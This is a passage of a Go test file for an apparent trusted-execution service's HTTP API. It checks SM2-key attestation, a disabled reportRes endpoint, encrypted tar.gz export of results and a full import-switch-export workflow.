		if api.Error != 0 {
			t.Fatalf("expected error=0, got %d msg=%s", api.Error, api.Msg)
		}
		result, ok := api.Result.(map[string]any)
		if !ok {
			t.Fatalf("result is not a map: %T", api.Result)
		}
		if result["requestId"] != "req-att-001" {
			t.Fatalf("requestId = %q, want req-att-001", result["requestId"])
		}
		attestationValue, ok := result["attestation"].(string)
		if !ok || attestationValue == "" {
			t.Fatal("attestation is empty")
		}
		decoded, err := base64.StdEncoding.DecodeString(attestationValue)
		if err != nil {
			t.Fatalf("decode base64 attestation: %v", err)
		}
		if len(decoded) != 2548 {
			t.Fatalf("attestation size = %d, want 2548", len(decoded))
		}
		attestationValues, ok := result["attestationValues"].(string)
		if !ok || attestationValues == "" {
			t.Fatal("attestationValues is empty")
		}
		var attValues struct {
			UserData string `json:"userdata"`
		}
		if err := json.Unmarshal([]byte(attestationValues), &attValues); err != nil {
			t.Fatalf("unmarshal attestationValues: %v", err)
		}
		if !strings.HasPrefix(attValues.UserData, "-----BEGIN PUBLIC KEY-----") {
			t.Fatalf("userdata = %q, want PEM public key", attValues.UserData)
		}
		parsedPub, err := teecrypto.ParseSM2PublicKeyPEM([]byte(attValues.UserData))
		if err != nil {
			t.Fatalf("parse userdata PEM: %v", err)
		}
		if got := sm2UserDataFromPublicKey(parsedPub); !bytes.Equal(got, state.UserData) {
			t.Fatalf("userdata bytes = %x, want %x", got, state.UserData)
		}
	})

	t.Run("missing requestId", func(t *testing.T) {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		writer.Close()

		req, err := http.NewRequest("POST", server.URL+"/v1/taa/getAttestation", body)
		if err != nil {
			t.Fatalf("create request: %v", err)
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("send request: %v", err)
		}
		api := decodeResponse(t, resp)
		if api.Error == 0 {
			t.Fatal("expected error for missing requestId")
		}
	})
}

// ── Test: /v1/taa/reportRes 服务端禁用 ────────────────

func TestReportResHandlerDisabled(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/reportRes", map[string]any{
		"requestId": "req-report-001",
		"code":      0,
		"msg":       nil,
	})
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("status = %d, want 404", resp.StatusCode)
	}
}

// extractTarGzMap 将 tar.gz 字节解压为文件名→内容的映射（跳过目录项）。
func extractTarGzMap(t *testing.T, data []byte) map[string][]byte {
	t.Helper()
	gz, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		t.Fatalf("gzip reader: %v", err)
	}
	defer gz.Close()
	tr := tar.NewReader(gz)
	files := make(map[string][]byte)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("tar next: %v", err)
		}
		if hdr.Typeflag == tar.TypeDir {
			continue
		}
		data, err := io.ReadAll(tr)
		if err != nil {
			t.Fatalf("tar read %s: %v", hdr.Name, err)
		}
		files[hdr.Name] = data
	}
	return files
}

func keysOfMap(m map[string][]byte) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// ── Test: /v1/taa/export with result check ───────────────

func TestExportResultCheck(t *testing.T) {
	state, server := setupTestServer(t)
	sm2Key := state.SM2PrivateKey
	// 准备公钥 PEM
	sdkPub := &sm2Key.PublicKey
	pubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(sdkPub)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	resultDir := t.TempDir()
	state.Security.ResultDir = resultDir
	resultPlaintext := []byte("model=ok\n")

	record := seedExportIndexRecord(t, state, "req-export-result-check", "task-001", "train")
	if err := os.WriteFile(filepath.Join(record.ResultDir, "train.bin"), resultPlaintext, 0o644); err != nil {
		t.Fatal(err)
	}

	mux := http.NewServeMux()
	RegisterRoutes(mux, state)
	server = httptest.NewServer(mux)
	t.Cleanup(server.Close)

	resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
		"requestId": "req-export-result-check",
		"publicKey": string(pubPEM),
		"taskId":    "task-001",
	})
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Fatalf("expected 200 with safe result, got %d body=%s", resp.StatusCode, body)
	}
	if got := resp.Header.Get("Content-Type"); got != "application/octet-stream" {
		t.Fatalf("Content-Type = %q, want application/octet-stream", got)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response body: %v", err)
	}
	decrypted := openSealedForTAA(t, sm2Key, body)
	files := extractTarGzMap(t, decrypted)
	if got, ok := files["train/train.bin"]; !ok {
		t.Fatalf("tar.gz missing train/train.bin, got keys: %v", keysOfMap(files))
	} else if !bytes.Equal(got, resultPlaintext) {
		t.Fatalf("result = %q, want %q", got, resultPlaintext)
	}
}

// ── Test: full workflow ──────────────────────────────────

func TestFullWorkflow(t *testing.T) {
	state, server := setupTestServer(t)

	// 准备公钥用于 phase 1 import
	state.mu.RLock()
	wfSM2Key := state.SM2PrivateKey
	state.mu.RUnlock()
	wfPub := &wfSM2Key.PublicKey
	wfPubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(wfPub)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	// 1. Import model with publicKey (download will fail with fake URL, but key is saved)
	resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
		"resourceUrl": "http://example.com/model.tar.gz",
		"requestId":   "req-wf-001",
		"publicKey":   string(wfPubPEM),
	})
	api := decodeResponse(t, resp)
	// 下载会失败，但 publicKey 应该已保存
	if api.Error == 0 {
		t.Log("import model succeeded (unexpected with fake URL)")
	}

	// 2. Switch to test phase
	resp = postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 2})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("switch to test: %s", api.Msg)
	}

	// 3. Switch to training phase
	resp = postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 3})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("switch to training: %s", api.Msg)
	}

	// 4. /v1/taa/reportRes is a TAA -> platform callback only; TAA server no longer accepts it.
	resp = postJSON(t, server.URL+"/v1/taa/reportRes", map[string]any{
		"requestId": "req-wf-003",
		"code":      0,
		"msg":       nil,
	})
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("reportRes status = %d, want 404", resp.StatusCode)
	}
	resp.Body.Close()

	// 5. Export result by indexed lookup
	wfPlaintext := []byte("mock training result")
	wfRecord := seedExportIndexRecord(t, state, "req-export-full-workflow", "task-wf-001", "train")
	if err := os.WriteFile(filepath.Join(wfRecord.ResultDir, "debug.bin"), wfPlaintext, 0o644); err != nil {
		t.Fatal(err)
	}
	resp = postJSON(t, server.URL+"/v1/taa/export", map[string]any{
		"requestId": "req-export-full-workflow",
		"taskId":    "task-wf-001",
		"publicKey": string(wfPubPEM),
	})
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		t.Fatalf("export status = %d body=%s", resp.StatusCode, body)
	}
	if got := resp.Header.Get("X-TAA-Task-Id"); got != "task-wf-001" {
		resp.Body.Close()
		t.Fatalf("export X-TAA-Task-Id = %q, want task-wf-001", got)
	}
	if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
		resp.Body.Close()
		t.Fatalf("export X-TAA-Encrypted = %q, want true", got)
	}
	sealed, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		t.Fatalf("read export body: %v", err)
	}
	wfDecrypted := openSealedForTAA(t, wfSM2Key, sealed)
	files := extractTarGzMap(t, wfDecrypted)
	if got, ok := files["train/debug.bin"]; !ok {
		t.Fatalf("tar.gz missing train/debug.bin, got keys: %v", keysOfMap(files))
	} else if !bytes.Equal(got, wfPlaintext) {
		t.Fatalf("export result = %q, want %q", got, wfPlaintext)
	}

	// 7. Get attestation
	resp = postJSON(t, server.URL+"/v1/taa/getAttestation", map[string]any{
		"requestId": "req-wf-004",
	})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("get attestation: %s", api.Msg)
	}
	attResult := api.Result.(map[string]any)
	if attResult["requestId"] != "req-wf-004" {
		t.Fatalf("attestation requestId = %v", attResult["requestId"])
	}
	if attResult["attestation"] == "" {
		t.Fatal("attestation is empty")
	}
	if attResult["attestationValues"] == "" {
		t.Fatal("attestationValues is empty")
	}
}
